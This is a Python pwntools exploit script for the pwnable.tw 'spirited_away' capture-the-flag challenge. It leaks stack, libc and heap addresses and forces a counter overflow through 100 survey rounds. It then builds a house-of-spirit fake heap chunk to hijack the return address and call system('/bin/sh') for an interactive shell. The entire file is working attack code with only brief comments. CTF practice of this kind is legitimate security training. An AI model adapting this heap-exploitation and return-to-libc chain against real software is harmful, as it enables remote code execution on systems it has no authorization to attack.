#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeef
DWORD = 4
CHUNK_HDR = 2 * DWORD

elf = ELF("./spirited_away_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10204)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        #gdb.attach(p, "\n".join(
        #           ["b *0x80488d3", # survey's leave
        #           ]))

class FakeChunk:
    def __init__(self, prev_size=0, size=0x20, fwd=0, bck=0, nxt_fwd=0, nxt_bck=0):
        self.prev_size = prev_size
        self.size = size
        self.fwd = fwd
        self.bck = bck
        self.nxt_fwd = nxt_fwd
        self.nxt_bck = nxt_bck

    def dump_allocated(self):
        P = 1
        payload = p32(self.prev_size)
        payload += p32(self.size | P)
        payload = payload.ljust(self.size, b"\x00")
        return payload

def do_survey(name=PAD(0x3c), age=str(0x11111111).encode(),
              reason=PAD(0x50), comment=PAD(0x3c), repeat=b"Y"):
    """
    By default, do the survey with dummy bytes padded to the size.
    As for the "age" variable (int type), avoid NULL bytes for information leak.
    """
    p.sendafter(b"Please enter your name: ", name)
    p.sendlineafter(b"Please enter your age: ", age)
    p.sendafter(b"Why did you came to see this movie? ", reason)
    p.sendafter(b"Please enter your comment: ", comment)

    p.recvuntil(b"Name: ")
    name_buf_leak = p.recvuntil(b"Age: ")[:-5]
    p.recvuntil(b"Reason: ")
    reason_buf_leak = p.recvuntil(b"Comment: ")[:-9]
    leak = p.recvuntil(b"comment so far.").split(b"\n")
    comment_buf_leak, times_record = leak[0], leak[-1]
    log.debug(times_record.decode())
    p.sendlineafter(b"Would you like to leave another comment? <y/n>:", repeat)
    return [name_buf_leak, reason_buf_leak, comment_buf_leak]

def leak_stack():
    _, reason, _ = do_survey(reason=PAD(0x50))
    saved_ebp_leak = u32(reason[0x50: 0x54])
    log.info("stack leak: " + hex(saved_ebp_leak))
    return saved_ebp_leak

def leak_libc_base():
    _, reason, _ = do_survey(reason=PAD(0x50))
    # a stack leftover on main()
    libc_leak = u32(reason[0x58: 0x5c])
    log.info("libc leak: " + hex(libc_leak))
    return libc_leak

def leak_heap():
    _, _, comment  = do_survey(comment=PAD(0x50))
    heap_leak = u32(comment[0x54:0x58])
    log.info("heap leak: " + hex(heap_leak))
    return heap_leak


def house_of_spirit(saved_ebp):
    """
    Traditional house-of-spirit, tcache does not exist in libc.2.23
    """
    # malloc(0x3c) will have chunk size 0x40
    DISPATCH_SIZE = 0x40

    curr_ebp = saved_ebp - 0x20
    reason_buf_size_slot = curr_ebp - 0xac
    stack_reason_buf = curr_ebp - 0x50

    # house of spirit
    comment = PAD(0x50) + p32(DUMMY) + p32(stack_reason_buf + CHUNK_HDR)
    reason = FakeChunk(size=DISPATCH_SIZE).dump_allocated()
    reason += FakeChunk(size=0x100).dump_allocated()[:CHUNK_HDR]
    do_survey(comment=comment, reason=reason)

def pop_shell(saved_ebp, heap_buf):
    """
    Uses house-of-spirit attack to poison the fastbin.
    Then, allocate a buffer that can bufovfl the return address of survey().
    """

    if args.D:
        gdb.attach(p, "b *0x80488c9")
    log.info("heap attacking!")

    house_of_spirit(saved_ebp)
    name = PAD(0x48) + p32(DUMMY)
    name += p32(libc.symbols["system"]) + p32(DUMMY) + p32(next(libc.search(b"/bin/sh\x00")))
    assert(len(name) < 0x6e)
    comment = PAD(0x50) + p32(DUMMY) + p32(heap_buf)

    # if the size read is not zero, we cannot use empty string (i.e. b"")
    # hence b"\n" here
    do_survey(name=name, reason=b"\n", comment=comment, repeat=b"n")


def exploit():
    saved_ebp_leak = leak_stack()
    libc_leak = leak_libc_base()
    libc.address = libc_leak + 0xf7d78000 - 0xf7f28d60

    # do_survey 100 times to overflow on sprintf()-ed buffer
    # We need 100 times to make the "cnt" variable 3-digit.
    # We had do_survey twice, so 100 - 2 == 98 times
    for i in range(98):
        if i < 8:
            # any input before
            do_survey()
        else:
            # 2-digit "cnt" makes name/comment buffer read() 0 bytes
            do_survey(name=b"", comment=b"")
        if i % 10 == 0:
            log.info("{} th survey completed".format(i))
    # from now on comment/name buffer can write 0x6e

    # leak heap data address
    heap_leak = leak_heap()

    # spirited away
    pop_shell(saved_ebp_leak, heap_leak)

    p.interactive()

if __name__ == "__main__":
    exploit()
